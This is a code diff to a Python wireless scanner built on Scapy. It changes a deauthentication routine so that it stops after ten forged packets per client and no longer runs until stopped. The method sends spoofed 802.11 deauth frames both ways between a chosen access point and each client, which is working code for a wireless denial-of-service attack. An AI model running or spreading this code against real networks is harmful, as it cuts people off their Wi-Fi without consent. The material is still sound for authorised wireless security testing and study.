@@ -32,6 +32,9 @@ class NetworkScanner():
         self.stop_sniff = threading.Event()
         self.stop_changing_channel = threading.Event()
         self.stop_deauth = threading.Event()
+
+        self.deauth_packet_count = 0
+        self.max_packets = 0
         
 
     def handle_packet(self, pkt):
@@ -123,12 +126,16 @@ class NetworkScanner():
     
     def deauth(self):
         """Craft and send deauthentication packets"""
-        while not self.stop_deauth.is_set():
+        self.deauth_packet_count = 0
+        self.max_packets = 10 * len(self.selected_ap.clients)
+        while not self.deauth_packet_count >= self.max_packets:
             for client in self.selected_ap.clients:
                 ap_to_client = RadioTap()/Dot11(type=0, subtype=12, addr1=self.selected_ap.bssid, addr2=client, addr3=self.selected_ap.bssid)/Dot11Deauth()
                 client_to_ap = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=self.selected_ap.bssid, addr3=self.selected_ap.bssid)/Dot11Deauth()
                 sendp(ap_to_client, iface=self.interface_name, verbose=False)
+                self.deauth_packet_count += 1
                 sendp(client_to_ap, iface=self.interface_name, verbose=False)
+                self.deauth_packet_count += 1
 
     def start_sniffing(self, filter=''):
         sniff(
